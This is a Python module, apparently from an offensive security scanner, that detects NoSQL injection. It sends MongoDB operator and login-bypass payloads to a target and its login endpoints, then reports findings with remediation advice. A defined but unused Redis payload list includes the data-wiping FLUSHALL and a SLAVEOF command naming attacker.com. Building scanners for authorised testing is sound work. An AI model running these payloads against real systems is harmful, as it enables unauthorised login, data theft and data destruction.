"""NoSQL 注入检测器"""
import re
import time
import json
import urllib.parse
from typing import List
from secops_core.http_client import http_get, http_post
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class NoSQLiDetector(BaseDetector):
    """NoSQL 注入检测器 (MongoDB/Redis)"""

    name = "nosqli"
    category = "NoSQLi"

    # MongoDB 注入 Payloads
    MONGO_PAYLOADS = [
        # 基础运算符注入
        {"$gt": ""},
        {"$ne": ""},
        {"$gte": ""},
        {"$lt": ""},
        {"$regex": ".*"},
        {"$exists": True},
        {"$in": [True]},
        {"$where": "1==1"},
        {"$where": "this.password.length > 0"},
        {"$expr": {"$gt": [1, 0]}},

        # JSON 字符串格式
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
    ]

    # Redis 注入 Payloads
    REDIS_PAYLOADS = [
        "INFO",
        "KEYS *",
        "CONFIG GET *",
        "FLUSHALL",
        "SLAVEOF attacker.com 6379",
        "\r\nINFO\r\n",
        "*1\r\n$4\r\nINFO\r\n",
    ]

    # 认证绕过 Payloads
    AUTH_BYPASS_PAYLOADS = [
        # MongoDB auth bypass
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"user": {"$ne": ""}, "pass": {"$ne": ""}},
        {"login": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"email": {"$ne": ""}, "password": {"$ne": ""}},

        # JSON string format
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"user": {"$ne": null}, "pass": {"$ne": null}}',
    ]

    ERROR_PATTERNS = [
        (r"MongoError", "MongoDB"),
        (r"MongoError.*unauthorized", "MongoDB Auth"),
        (r"mongo.*exception", "MongoDB"),
        (r"redis.*error", "Redis"),
        (r"NOAUTH.*authentication", "Redis Auth"),
        (r"ERR unknown command", "Redis"),
        (r"SyntaxError.*JSON", "JSON 解析"),
        (r"MongoParseError", "MongoDB 解析"),
        (r"E11000 duplicate key", "MongoDB 索引"),
    ]

    SUCCESS_PATTERNS = [
        (r"uid=\d+", "命令执行"),
        (r"root:.*:0:0", "文件读取"),
        (r"redis_version", "Redis INFO"),
        (r"ok", "Redis 响应"),
    ]

    def test(self, target_url: str, params: list = None) -> List[Finding]:
        findings = []

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["user", "username", "login", "email",
                          "password", "pass", "pwd", "auth",
                          "key", "id", "query", "filter"]

        # MongoDB 运算符注入 (JSON POST)
        for param in params:
            for payload in self.MONGO_PAYLOADS:
                test_data = json.dumps({param: payload})
                headers = {"Content-Type": "application/json"}

                log_audit("NOSQLI_MONGO", base_url, f"param={param}")
                status, _, body = http_post(base_url, test_data, headers=headers, timeout=8)

                if status == 0:
                    continue

                # 检查是否返回了异常多的数据 (认证绕过)
                if status == 200 and len(body) > 100:
                    if any(f.vuln_type == "NoSQLi" and param in f.title for f in findings):
                        continue

                    findings.append(Finding(
                        vuln_type="NoSQLi", severity="critical",
                        title=f"MongoDB NoSQL 注入 - 参数 {param}",
                        location=base_url, payload=json.dumps(payload)[:200],
                        evidence=f"注入运算符后响应长度: {len(body)} bytes",
                        description=f"参数 {param} 允许注入 MongoDB 运算符，可能导致认证绕过或数据泄露。",
                        remediation="使用类型校验、禁止用户输入直接作为查询对象、使用 ODM"
                    ))
                    break

                # 检查错误信息泄露
                for pattern, db_type in self.ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append(Finding(
                            vuln_type="NoSQLi", severity="medium",
                            title=f"NoSQL 错误信息泄露 ({db_type}) - 参数 {param}",
                            location=base_url, payload=json.dumps(payload)[:200],
                            evidence=f"数据库错误: {match.group()[:150] if (match := re.search(pattern, body, re.IGNORECASE)) else ''}",
                            description=f"参数 {param} 触发了 {db_type} 错误信息泄露。",
                            remediation="关闭调试模式、自定义错误页面"
                        ))
                        break

                time.sleep(ATTACK_DELAY)

        # 认证绕过测试
        auth_endpoints = ["/login", "/auth", "/signin", "/api/login", "/api/auth"]
        for endpoint in auth_endpoints:
            auth_url = f"{parsed.scheme}://{parsed.netloc}{endpoint}"

            for payload in self.AUTH_BYPASS_PAYLOADS:
                if isinstance(payload, dict):
                    test_data = json.dumps(payload)
                else:
                    test_data = payload

                headers = {"Content-Type": "application/json"}

                log_audit("NOSQLI_AUTH", auth_url, f"payload={str(payload)[:100]}")
                status, _, body = http_post(auth_url, test_data, headers=headers, timeout=8)

                if status == 0:
                    continue

                if status == 200 and ("token" in body.lower() or "success" in body.lower()
                                       or "welcome" in body.lower() or "dashboard" in body.lower()):
                    findings.append(Finding(
                        vuln_type="NoSQLi", severity="critical",
                        title=f"NoSQL 认证绕过 - 端点 {endpoint}",
                        location=auth_url, payload=str(payload)[:200],
                        evidence=f"认证绕过成功，响应: {body[:200]}",
                        description="通过 NoSQL 注入绕过身份认证。",
                        remediation="使用严格类型校验、参数化查询、ORM 框架"
                    ))
                    break

                time.sleep(ATTACK_DELAY)

        return findings
